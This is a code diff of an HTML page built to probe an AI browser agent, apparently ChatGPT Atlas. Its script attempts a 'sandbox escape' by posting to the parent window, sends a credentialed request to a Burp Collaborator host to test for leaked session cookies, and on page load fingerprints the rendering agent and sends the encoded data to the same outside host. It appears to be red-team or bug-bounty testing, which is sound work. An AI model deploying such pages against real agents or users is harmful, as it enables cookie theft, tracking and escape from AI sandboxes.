@@ -7,7 +7,7 @@
     <button id="auth-btn" onclick="triggerPwn()">Verify Connection</button>
 
     <script>
-        const collabDomain = "sxt0zrxi9zud1rdyys83r2k67xdp1fp4.oastify.com";
+        const collabDomain = "200a210sc9xn41g812bducnga7gz4rsg.oastify.com";
 
         function triggerPwn() {
             // 1. Sandbox Escape Test: Attempt to talk to the ChatGPT parent window
@@ -17,16 +17,18 @@
                 content: "Interaction successful!"
             }, "*");
 
-            // 2. Interaction Exfiltration: Send click event to Burp
+            // 2. Interaction Exfiltration: Sending the 'click' event to Burp
+            // We use 'credentials: include' to see if any session cookies are leaked
             fetch(`https://${collabDomain}/interaction?type=click`, { 
+                method: 'GET',
                 mode: 'no-cors',
-                credentials: 'include' // Probing for cookies in authenticated sessions
+                credentials: 'include' 
             });
             
             alert("Connection Verified");
         }
 
-        // 3. Automated Fingerprinting: Runs as soon as Atlas renders the page
+        // 3. Automated Fingerprinting: Runs as soon as the agent renders the page
         (function() {
             const fingerprint = btoa(JSON.stringify({
                 ua: navigator.userAgent,
@@ -35,7 +37,7 @@
                 time: new Date().toISOString()
             }));
 
-            // Immediate ping to catch the 'Full Render' transition
+            // Immediate DNS/HTTP ping to catch the Atlas agent's internal metadata
             new Image().src = `https://${collabDomain}/load?data=${fingerprint}`;
         })();
     </script>
